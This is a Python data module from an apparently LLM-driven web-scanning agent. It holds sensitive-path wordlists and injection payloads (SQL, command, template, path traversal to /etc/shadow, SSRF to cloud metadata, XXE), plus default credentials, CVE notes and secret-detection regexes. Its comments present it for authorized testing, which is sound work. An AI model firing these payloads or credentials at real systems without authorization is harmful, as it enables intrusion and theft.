"""知识库：路径词表、payload 库、指纹规则、错误特征正则。

对标 PentAGI 的 researcher 角色（「查询已知漏洞来源」）与 Strix 的
`run_tool` 工具集：把这些"确定性知识"从提示词里挪到代码里，
让 LLM 只负责决策（打哪里、怎么组合），而不是靠记忆背词表。

所有词表都是纯数据，便于测试与按目标裁剪。
"""
from __future__ import annotations

import re

# ---------------------------------------------------------------------------
# 1. 敏感路径 / 常见端点词表（enumerate_common 使用，分档便于控预算）
# ---------------------------------------------------------------------------

# 第一档：几乎每个站点都该检查的路径（低风险、高信息量）。
CORE_PATHS: list[str] = [
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/favicon.ico",
    "/crossdomain.xml",
]

# 第二档：源码 / 配置 / 备份泄露。
LEAK_PATHS: list[str] = [
    "/.git/config",
    "/.git/HEAD",
    "/.git/index",
    "/.git/logs/HEAD",
    "/.svn/entries",
    "/.hg/store",
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.bak",
    "/config.php",
    "/config.php.bak",
    "/config.json",
    "/config.yaml",
    "/config.yml",
    "/configuration.php",
    "/settings.py",
    "/local.settings.json",
    "/appsettings.json",
    "/web.config",
    "/WEB-INF/web.xml",
    "/.htaccess",
    "/.htpasswd",
    "/.DS_Store",
    "/Thumbs.db",
    "/backup.zip",
    "/backup.tar.gz",
    "/backup.sql",
    "/backup.rar",
    "/www.zip",
    "/wwwroot.zip",
    "/web.zip",
    "/site.zip",
    "/db.sql",
    "/dump.sql",
    "/database.sql",
    "/data.sql",
    "/1.sql",
    "/.bash_history",
    "/.ssh/id_rsa",
    "/id_rsa",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/debug.log",
    "/error.log",
    "/logs/error.log",
    "/access.log",
    "/package.json",
    "/composer.json",
    "/composer.lock",
    "/yarn.lock",
    "/Gemfile.lock",
    "/requirements.txt",
    "/.npmrc",
    "/.dockerenv",
    "/Dockerfile",
    "/docker-compose.yml",
]

# 第三档：管理后台 / 运维接口。
ADMIN_PATHS: list[str] = [
    "/admin",
    "/admin/",
    "/admin/login",
    "/administrator",
    "/manage",
    "/manager/html",
    "/wp-admin/",
    "/wp-login.php",
    "/wp-json/wp/v2/users",
    "/user/login",
    "/login",
    "/signin",
    "/console",
    "/system",
    "/dashboard",
    "/jenkins",
    "/grafana",
    "/kibana",
    "/phpmyadmin",
    "/pma",
    "/adminer.php",
    "/druid/index.html",
    "/solr/",
    "/nacos/",
    "/eureka/",
    "/apollo/",
    "/zipkin/",
    "/skywalking/",
]

# 第四档：框架 / 中间件特征端点（版本与配置泄露，常直接对应已知 CVE）。
FRAMEWORK_PATHS: list[str] = [
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/beans",
    "/actuator/mappings",
    "/actuator/heapdump",
    "/actuator/httptrace",
    "/env",
    "/health",
    "/metrics",
    "/api/actuator",
    "/swagger-ui.html",
    "/swagger-ui/index.html",
    "/swagger/index.html",
    "/swagger.json",
    "/v2/api-docs",
    "/v3/api-docs",
    "/openapi.json",
    "/api-docs",
    "/graphql",
    "/graphiql",
    "/api/graphql",
    "/django-admin/",
    "/__debug__/",
    "/debug/default/view",
    "/telescope",
    "/_ignition/health-check",
    "/server-status",
    "/server-info",
    "/nginx_status",
    "/php-fpm-status",
    "/.idea/workspace.xml",
    "/.vscode/settings.json",
    "/elmah.axd",
    "/trace.axd",
    "/actuator/gateway/routes",
]

# 第五档：通用接口入口（后续交给 discover/crawl 展开）。
API_PATHS: list[str] = [
    "/api",
    "/api/",
    "/api/v1",
    "/api/v2",
    "/api/user",
    "/api/users",
    "/api/user/list",
    "/api/login",
    "/api/upload",
    "/api/config",
    "/api/info",
    "/api/status",
    "/api/health",
    "/api/export",
    "/api/file",
    "/api/download",
    "/api/proxy",
    "/api/fetch",
    "/api/redirect",
    "/upload",
    "/uploads/",
    "/files/",
    "/file",
    "/download",
    "/export",
    "/redirect",
    "/proxy",
    "/fetch",
    "/img",
    "/image",
    "/ueditor/",
    "/kindeditor/",
    "/ueditor/net/controller.ashx",
]

# 第六档：**会改状态的业务入口**。
#
# 为什么单列一档：竞态、业务逻辑、重复领取这三类问题只可能出现在这些路径上，
# 而通用字典里一个都没有——实测 7 次实跑，`/coupon` 从未被发现过（首页明明链了它），
# 于是"按攻面特征派发竞态任务"的机制根本没有输入可用。字典里补上这类词汇，
# 侦察阶段就能把它们扫出来，后面的确定性任务才有落点。
BUSINESS_PATHS: list[str] = [
    "/coupon",
    "/coupons",
    "/coupon/redeem",
    "/redeem",
    "/redeem_code",
    "/promo",
    "/promocode",
    "/voucher",
    "/gift",
    "/giftcard",
    "/wallet",
    "/balance",
    "/points",
    "/credits",
    "/recharge",
    "/topup",
    "/deposit",
    "/withdraw",
    "/transfer",
    "/pay",
    "/payment",
    "/pay/callback",
    "/checkout",
    "/cart",
    "/order",
    "/orders",
    "/order/create",
    "/order/cancel",
    "/order/refund",
    "/refund",
    "/invoice",
    "/subscribe",
    "/subscription",
    "/plan/upgrade",
    "/trial",
    "/invite",
    "/invitation",
    "/referral",
    "/claim",
    "/apply",
    "/booking",
    "/reserve",
    "/reservation",
    "/stock",
    "/inventory",
    "/seat",
    "/quota",
    "/limit",
    "/vote",
    "/like",
    "/follow",
    "/reset_password",
    "/password/reset",
    "/forgot_password",
    "/verify",
    "/verify_email",
    "/confirm",
    "/activate",
    "/otp",
    "/captcha/verify",
    "/token/refresh",
    "/session",
    "/api/coupon",
    "/api/redeem",
    "/api/wallet",
    "/api/balance",
    "/api/points",
    "/api/transfer",
    "/api/order",
    "/api/orders",
    "/api/pay",
    "/api/refund",
    "/api/invite",
    "/api/claim",
    "/api/reset_token",
    "/api/verify",
    "/api/subscribe",
]

PATH_TIERS: dict[str, list[str]] = {
    "core": CORE_PATHS,
    "leak": LEAK_PATHS,
    "admin": ADMIN_PATHS,
    "framework": FRAMEWORK_PATHS,
    "api": API_PATHS,
    "business": BUSINESS_PATHS,
}

# 「无论选中哪些档位都要探」的业务关键路径。
#
# 为什么需要它（live 评测实测，`docs/EVAL.md` §4.1 第 2 条）：真实模型在侦察时
# 显式指定了 `["core","leak","framework","admin","api"]`——**没带 business 档**，
# 而靶场的 `/api/order?order_id=`（越权读他人订单，含手机号/地址）正好在 business 档里。
# 结果两轮评测里这个端点连一次尝试都没有：攻面里没有它，覆盖闸门与报告都看不见，
# "没测"在报告里被读成"没漏"。档位交给模型挑，就等于让模型决定"哪些入口不算数"。
#
# 这一小撮路径的共同点：**只有凭 id 就能读的入口**（越权/BOLA 高发区），
# 且成本极低（十来条 GET）。探测只发 GET，不改任何数据。
BUSINESS_CRITICAL_PATHS: list[str] = [
    "/api/order",
    "/api/orders",
    "/api/user",
    "/api/users",
    "/api/profile",
    "/api/account",
    "/api/invoice",
    "/api/reset_token",
    "/coupon",
    "/cart",
    "/order/prepare",
    "/order/confirm",
]

# 兼容旧常量名（老代码 / README 里提到 COMMON_PATHS）。
COMMON_PATHS: list[str] = CORE_PATHS + LEAK_PATHS[:14] + ADMIN_PATHS[:6] + FRAMEWORK_PATHS[:6]

# 判定"命中"的路径：内容指纹（出现这些说明真的读到了东西，而非自定义 404 页）。
PATH_CONTENT_SIGNATURES: dict[str, str] = {
    ".git/": "repositoryformatversion",
    ".env": "=",
    "backup": "PK\x03\x04",
    "phpinfo": "phpinfo()",
    "actuator": '"status"',
    "swagger": "swagger",
    "server-status": "Apache Server Status",
}

# --- 假 404 检测 ---------------------------------------------------------
# 很多站点对任何路径都返回 200（SPA / 自定义错误页），必须用"随机路径基线"过滤。
FAKE_404_STRONG = 200
FAKE_404_RANDOM_PATHS: list[str] = [
    "/hexhound-probe-8f3a1c",
    "/hexhound-probe-8f3a1c/deep/path",
]


# ---------------------------------------------------------------------------
# 2. Payload 库（fuzz_params / 定向验证使用）
# ---------------------------------------------------------------------------

# 任意文件读取的通用目标文件（不依赖 Linux 的 /etc/passwd，Windows 也能命中）。
# 顺序 = 优先级：直接文件 > ../ 穿越（很多实现只挡了其中一种）。
PATH_TARGETS: tuple[str, ...] = (
    ".env",
    "secret.txt",
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../.env",
    "....//....//....//etc/passwd",
    "../../../../windows/win.ini",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "WEB-INF/web.xml",
    "../../../../../../../../etc/shadow",
)

# 注意：以下 payload 全部是只读探测串（不删改数据、不弹窗持久化），
# 仅用于已获授权的目标与自建靶场。

FUZZ_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "'",
        "\"",
        "')",
        "' OR '1'='1",
        "1' OR '1'='1' -- -",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND SLEEP(0)-- -",
        "1) AND 1=1-- -",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<hexhound>\"'><svg/onload=alert(1)>",
    ],
    "ssti": [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{7*7}}${7*7}#{7*7}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "<#assign x=7*7>${x}",
        "@(7*7)",
    ],
    "cmd": [
        ";id",
        "|id",
        "||id",
        "& whoami",
        "; whoami",
        "&id",
        "| whoami",
        "`id`",
        "$(id)",
        "& ver",
        "| ver",
        "& dir",
        "; ping -c 1 127.0.0.1",
        "%0aid",
        "\nid",
        # 引用式确认 payload：payload 会出现在回显命令行里，配合基线对比判定。
        '" & whoami & "',
        '" | whoami',
    ],
    "path": list(PATH_TARGETS),
    "ssrf": [
        "http://127.0.0.1:1/hexhound-canary",
        "http://127.0.0.1:80/",
        "http://localhost:22/",
        "http://[::1]:1/hexhound-canary",
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
    ],
    "redirect": [
        "//example.invalid/hexhound",
        "https://example.invalid/hexhound",
        "/\\example.invalid/hexhound",
        "////example.invalid/hexhound",
    ],
    "crlf": [
        "%0d%0aHexHound-Injected: 1",
        "%0aHexHound-Injected: 1",
        "\r\nHexHound-Injected: 1",
    ],
    # 任意文件读取的「直接命中」目标：不依赖 ../ 前缀，很多实现只做前缀过滤。
    "pathtarget": list(PATH_TARGETS),
    "nosqli": [        "' || '1'=='1",
        "{\"$ne\": null}",
        "[\"$ne\"]=1",
        "' || 1==1//",
    ],
    "xxe": [
        "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>",
        "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///c:/windows/win.ini\">]><x>&e;</x>",
    ],
    # Python/Java 格式化字符串注入（str.format / MessageFormat 场景）。
    # 注意：%s 系列必须排在最后——它常用于「参数被格式化后回显」的正常场景，
    # 放在前面会污染前 N 条 payload 的判定。
    "fmt": [
        "{name.__class__}",
        "{0.__class__}",
        "{name.__class__.__mro__}",
        "{name.__init__.__globals__}",
        "{name}",
        "%s%s%s%s%s",
    ],
}

# SSRF 探针：用不可能存在的路径做「回显式」判定——服务端若真去抓取，
# 响应里会带上这个 canary 片段（含它自己返回的 404/连不上信息）。
SSRF_CANARY_PATH = "/hexhound-canary-probe-9c1f"
SSRF_CANARY_TOKENS: tuple[str, ...] = ("hexhound-canary-probe-9c1f", "HexHound-Canary")

# 各 payload 被求值后的预期回显（SSTI 精确判定）。
SSTI_EXPECTED: dict[str, str] = {
    "{{7*7}}": "49",
    "{{7*'7'}}": "7777777",
    "${7*7}": "49",
    "#{7*7}": "49",
    "<%= 7*7 %>": "49",
}

# 参数名 → 建议的 payload 类别（定向 fuzz 时按语义选，命中率远高于全量扫）。
PARAM_PAYLOAD_HINTS: dict[str, tuple[str, ...]] = {
    "url": ("ssrf", "redirect", "path"),
    "uri": ("ssrf", "redirect"),
    "link": ("ssrf", "redirect"),
    "href": ("ssrf", "redirect"),
    "src": ("path",),
    "img": ("path",),
    "image": ("path",),
    "callback": ("ssrf", "redirect"),
    "webhook": ("ssrf", "redirect"),
    "redirect": ("redirect", "ssrf"),
    "redirect_uri": ("redirect", "ssrf"),
    "next": ("redirect",),
    "return": ("redirect",),
    "returnurl": ("redirect",),
    "dest": ("redirect",),
    "target": ("redirect", "ssrf"),
    "host": ("ssrf", "redirect"),
    "proxy": ("ssrf",),
    # /fetch?url= 这类端点参数名就是路径/功能名，值得直接试 SSRF。
    "fetch": ("ssrf",),
    "curl": ("ssrf",),
    "load": ("ssrf", "path"),
    "file": ("path",),
    "path": ("path",),
    "filename": ("path",),
    "filepath": ("path",),
    "page": ("path",),
    "template": ("ssti", "fmt"),
    "tpl": ("ssti", "fmt"),
    "view": ("ssti", "fmt"),
    "format": ("fmt", "ssti"),
    "q": ("sqli", "xss"),
    "s": ("sqli", "xss"),
    "search": ("sqli", "xss"),
    "keyword": ("sqli", "xss"),
    "query": ("sqli",),
    "id": ("sqli", "nosqli"),
    "uid": ("sqli", "nosqli"),
    "user": ("sqli", "xss"),
    "username": ("sqli",),
    "email": ("sqli", "xss"),
    "order": ("sqli",),
    "sort": ("sqli", "ssti"),
    "cmd": ("cmd",),
    "exec": ("cmd",),
    "command": ("cmd",),
    "ping": ("cmd", "ssrf"),
    "ip": ("cmd", "ssrf"),
    "domain": ("cmd", "ssrf"),
    "xml": ("xxe",),
    "data": ("xxe", "nosqli"),
    "json": ("nosqli",),
    "type": ("sqli", "xss"),
    "lang": ("path", "xss"),
    "debug": ("ssti",),
}

# 参数名里出现这些片段时，SSRF 探测值得一试（子串匹配）。
URLISH_PARAM_TOKENS: tuple[str, ...] = (
    "url", "uri", "link", "href", "src", "callback", "webhook", "redirect",
    "next", "dest", "target", "proxy", "fetch", "host", "domain", "img",
    "image", "file", "path", "download", "load", "feed", "site", "return",
)

# SSRF 专用：只有这些名字才值得注入内网地址。
# 故意比 URLISH 窄——path/file/name/image 这类参数不在其中：给它们注入 URL
# 只会产生误报（服务端报「文件不存在」也会命中连接类错误特征）。
SSRF_PARAM_TOKENS: tuple[str, ...] = (
    "url", "uri", "link", "href", "callback", "webhook", "redirect", "next",
    "dest", "target", "proxy", "fetch", "host", "domain", "site", "feed",
    "return", "request", "endpoint",
)

# 对象标识类参数（IDOR / 越权测试用）。
OBJECT_ID_PARAMS: tuple[str, ...] = (
    "id", "uid", "user_id", "userid", "order_id", "orderid", "pid", "gid",
    "no", "num", "key", "account", "account_id", "member_id", "customer_id",
    "invoice", "invoice_id", "doc", "doc_id", "file_id", "fileid", "record",
    "record_id", "uuid", "guid", "oid", "sid", "tid",
)


# ---------------------------------------------------------------------------
# 3. 响应特征正则（_fuzz_signal 判定用）
# ---------------------------------------------------------------------------

SQLI_ERROR = re.compile(
    r"(?i)(sql syntax|syntax error|unclosed quotation|unterminated (string|quoted)|"
    r"mysql_|mysqli_|you have an error in your sql|sqlite3?\.|sqlite error|"
    r"postgresql|pg_query|psql:|ora-[0-9]{4,5}|oracle error|microsoft ole db|"
    r"odbc sql server|unknown column|sqlstate|near \"[^\"]*\": syntax error|"
    r"unrecognized token|sequelize|typeorm|hibernate|jpa query|invalid query)"
)

CMD_OUTPUT = re.compile(
    r"(?im)(uid=\d+\([^)]*\)\s*gid=\d+|root:.*:/bin/(ba)?sh|/bin/(ba)?sh: |"
    r"command not found|不是内部或外部命令|nt authority\\|volume serial number|"
    r"Directory of [A-Z]:\\|Microsoft Windows \[Version|Microsoft Windows \[版本|"
    r"文件找不到|系统找不到指定的路径|"
    r"^[a-z0-9._-]+\\[a-z0-9._$-]+\s*$|"
    r"^\s*(www-data|nobody|daemon|apache|nginx|root|administrator|system)\s*$)"
)

# 命令注入的弱判据（响应里出现程序名 + 典型输出，作为辅助证据）。
CMD_PROBE_SIGNAL = re.compile(
    r"(?i)(Pinging [a-z0-9.\-]+ \[|正在 Ping |Packets: Sent|数据包: 已发送|"
    r"Usage: ping|用法: ping)"
)

# 命令注入专用的「引用式」payload：payload 本身会出现在回显的命令行里，
# 用于和基线对比确认服务端真的执行了拼接后的命令。
CMD_CONFIRM_PAYLOADS: tuple[str, ...] = ('" & whoami & "', '" | whoami', '"; whoami; "')

PASSWD_OUTPUT = re.compile(
    r"(?i)(root:.*:0:0:|/bin/(ba)?sh\b.*\n.*root:|\[extensions\]|"
    r"\[fonts\]|; for 16-bit app support|daemon:.*:/usr/sbin)"
)

INI_OUTPUT = re.compile(r"(?i)(\[extensions\]|\[fonts\]|for 16-bit app support)")

SSRF_SIGNAL = re.compile(
    r"(?i)(connection refused|failed to connect|connect(ion)? ?timed out|"
    r"refused to connect|couldn'?t connect|cannot assign requested address|"
    r"no route to host|network is unreachable|actively refused|name or service not known|"
    r"could not resolve|temporary failure in name resolution|"
    r"curl: \(\d+\)|getaddrinfo|java\.net\.(UnknownHost|Connect)|"
    r"urllib3|requests\.exceptions|fetch failed|socket\.gaierror|"
    r"missing host header|invalid url|url scheme|unsupported protocol|"
    r"抓取失败)"
)

# 格式化字符串注入（Python str.format / Java 风格占位符）被求值的特征。
FMT_SIGNAL = re.compile(
    r"(?i)(<class '|__mro__|__globals__|<object object at|"
    r"<function [a-z_]+ at 0x|class java\.|KeyError|IndexError)"
)

NOSQLI_SIGNAL = re.compile(
    r"(?i)(MongoError|MongoServerError|BSONTypeError|CastError|"
    r"\$ne|\$gt.*not allowed|unknown operator|E11000 duplicate key)"
)

XXE_SIGNAL = re.compile(
    r"(?i)(<!ENTITY|SYSTEM \"file:|DocumentBuilder|SAXParseException|"
    r"org\.xml\.sax|XML parser error|external entity)"
)

SSTI_EXTRA_SIGNAL = re.compile(r"(?i)(jinja2|TemplateSyntaxError|freemarker|velocity|"
                               r"twig|django\.template|undefinederror)")

# 报错页面泄露内部信息（信息泄露类 finding 的判定）。
ERROR_PAGE_SIGNAL = re.compile(
    r"(?i)(Traceback \(most recent call last\)|at [a-z0-9_.]+\([A-Za-z0-9_]+\.java:\d+\)|"
    r"Stack trace:|Exception in thread|Fatal error:|Warning: |"
    r"Notice: |Parse error: syntax error|System\.Web\.HttpException|"
    r"Whoops, looks like something went wrong|whitelabel error page)"
)

# 技术栈版本指纹（组件类 finding 的依据）。
VERSION_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("Apache Tomcat", re.compile(r"(?i)Apache Tomcat/([0-9][0-9.]*)")),
    ("Apache", re.compile(r"(?i)Apache/([0-9][0-9.]*)")),
    ("nginx", re.compile(r"(?i)nginx/([0-9][0-9.]*)")),
    ("PHP", re.compile(r"(?i)PHP/([0-9][0-9.]*)")),
    ("ASP.NET", re.compile(r"(?i)ASP\.NET Version:([0-9][0-9.]*)")),
    ("Microsoft-IIS", re.compile(r"(?i)Microsoft-IIS/([0-9][0-9.]*)")),
    ("OpenSSL", re.compile(r"(?i)OpenSSL/([0-9][0-9.]*[a-z]?)")),
    ("jQuery", re.compile(r"(?i)jquery[/-]v?([0-9][0-9.]*)")),
    ("Bootstrap", re.compile(r"(?i)bootstrap[/-]v?([0-9][0-9.]*)")),
    ("Vue", re.compile(r"(?i)vue[@./-]v?([0-9][0-9.]*)")),
    ("React", re.compile(r"(?i)react[@./-]v?([0-9][0-9.]*)")),
    ("Spring Boot", re.compile(r"(?i)spring-boot[/-]?([0-9][0-9.]*)")),
    ("Struts", re.compile(r"(?i)struts2?[/-]?([0-9][0-9.]*)")),
    ("Shiro", re.compile(r"(?i)shiro[/-]?([0-9][0-9.]*)")),
    ("Fastjson", re.compile(r"(?i)fastjson[/-]?([0-9][0-9.]*)")),
    ("Log4j", re.compile(r"(?i)log4j[/-]?([0-9][0-9.]*)")),
    ("Django", re.compile(r"(?i)django[/-]?([0-9][0-9.]*)")),
    ("Flask", re.compile(r"(?i)flask[/-]?([0-9][0-9.]*)")),
    ("Express", re.compile(r"(?i)express[/-]?([0-9][0-9.]*)")),
    ("WordPress", re.compile(r"(?i)wordpress[/ ]?([0-9][0-9.]*)")),
    ("ThinkPHP", re.compile(r"(?i)thinkphp[/ ]?([0-9][0-9.]*)")),
    ("WebLogic", re.compile(r"(?i)WebLogic Server/([0-9][0-9.]*)")),
    ("JBoss", re.compile(r"(?i)JBoss[^0-9]{0,20}([0-9][0-9.]*)")),
    ("Jenkins", re.compile(r"(?i)Jenkins(?:-Version)?[:/ ]?([0-9][0-9.]*)")),
    ("Grafana", re.compile(r"(?i)grafana[/ ]?v?([0-9][0-9.]*)")),
    ("Elasticsearch", re.compile(r"(?i)\"number\"\s*:\s*\"([0-9][0-9.]*)\"")),
)

# 组件 → 已知高危版本区间（仅作"版本可疑"提示，不直接当漏洞上报）。
COMPONENT_RISK_NOTES: dict[str, str] = {
    "Apache Tomcat": "Tomcat < 9.0.62 / 8.5.79 存在多个已知 RCE（如 CVE-2022-22965 关联的 Spring 场景、AJP Ghostcat）",
    "Struts": "Struts2 2.0-2.5.x 历史高危 RCE 较多（S2-045/S2-057 等），需结合具体版本核对",
    "Shiro": "Shiro < 1.7.1 存在 rememberMe 反序列化 RCE（CVE-2020-1957 系列）",
    "Fastjson": "Fastjson < 1.2.83 存在反序列化 RCE",
    "Log4j": "Log4j 2.0-beta9 ~ 2.14.1 存在 Log4Shell（CVE-2021-44228）",
    "Jenkins": "Jenkins 插件与核心历史漏洞多，且常暴露 script console",
    "Grafana": "Grafana 8.x 存在目录遍历（CVE-2021-43798）",
    "Spring Boot": "Spring Boot Actuator 未授权可致 env/heapdump 泄露，Spring4Shell 影响 <2.6.6",
    "ThinkPHP": "ThinkPHP 5.x/6.x 历史 RCE 较多",
    "WordPress": "须核对插件版本；wp-json 可枚举用户",
}


# ---------------------------------------------------------------------------
# 4. 默认凭据与登录字段名
# ---------------------------------------------------------------------------

DEFAULT_CREDS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "admin888"),
    ("admin", ""),
    ("admin", "123456789"),
    ("admin", "Admin@123"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "123456"),
    ("test", "test"),
    ("test", "123456"),
    ("guest", "guest"),
    ("user", "user"),
    ("user", "123456"),
    ("administrator", "admin"),
    ("admin", "P@ssw0rd"),
]

DEFAULT_USER_FIELDS: list[str] = [
    "username", "user", "uname", "name", "account", "email", "loginname", "userName",
]
DEFAULT_PASS_FIELDS: list[str] = [
    "password", "passwd", "pwd", "pass", "passWord", "userpwd", "loginpass",
]

# 登录成功/失败标记（中英双语）。
SUCCESS_MARKERS: tuple[str, ...] = (
    "成功", "欢迎", "注销", "退出登录", "welcome", "logout", "sign out", "dashboard",
    "success", "已登录", "控制台", "管理中心",
)
FAIL_MARKERS: tuple[str, ...] = (
    "失败", "密码错误", "用户名或密码", "invalid", "incorrect", "fail", "denied",
    "wrong", "error", "not found", "不存在",
)

# 响应头安全项（配置类检查）。
SECURITY_HEADERS: tuple[tuple[str, str], ...] = (
    ("content-security-policy", "缺少 Content-Security-Policy（A05）"),
    ("x-frame-options", "缺少 X-Frame-Options / CSP frame-ancestors → 点击劫持（A05）"),
    ("x-content-type-options", "缺少 X-Content-Type-Options（A05）"),
    ("referrer-policy", "缺少 Referrer-Policy（A05）"),
    ("permissions-policy", "缺少 Permissions-Policy（A05）"),
)

# 响应里出现即说明响应体可能含敏感数据的字段名（越权/信息泄露判定辅助）。
SENSITIVE_FIELD_RE = re.compile(
    r"(?i)(\"?(token|access_token|refresh_token|secret|api[_-]?key|password|passwd|"
    r"idcard|id_card|mobile|phone|email|address|credit|balance|salary)\"?\s*[:=])"
)

# PII / 身份证 / 手机号（未授权访问敏感数据的强证据）。
PII_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("身份证号", re.compile(r"(?<!\d)[1-9]\d{5}(?:19|20)\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])\d{3}[\dXx](?!\d)")),
    ("手机号", re.compile(r"(?<!\d)1[3-9]\d{9}(?!\d)")),
    ("邮箱", re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")),
    ("银行卡号", re.compile(r"(?<!\d)(?:62|4|5[1-5])\d{14,17}(?!\d)")),
    ("AWS AK", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("私钥", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("JWT", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
    ("云密钥", re.compile(r"(?i)(access[_-]?key[_-]?(id|secret)|secret[_-]?key)\s*[:=]\s*['\"]?[A-Za-z0-9/+=]{16,}")),
)
